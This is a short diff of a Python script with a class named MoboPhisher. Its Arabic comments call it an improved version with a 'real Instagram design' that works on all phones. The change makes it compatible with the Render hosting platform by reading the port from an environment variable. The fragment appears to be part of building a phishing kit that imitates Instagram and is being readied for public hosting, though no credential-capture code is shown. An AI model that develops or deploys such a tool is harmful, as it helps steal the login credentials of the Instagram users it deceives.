@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# نسخة محسنة: تعمل على جميع الهواتف + تصميم Instagram الحقيقي
+# نسخة محسنة: تعمل على جميع الهواتف + تصميم Instagram الحقيقي + متوافقة مع Render
 
 import os
 import sys
@@ -338,7 +338,7 @@ class MoboPhisher:
 </html>"""
             return html
 
-        def launch(self):
+    def launch(self):
         # قراءة البورت من متغيرات البيئة ديال Render
         port = int(os.environ.get('PORT', 8080))
         
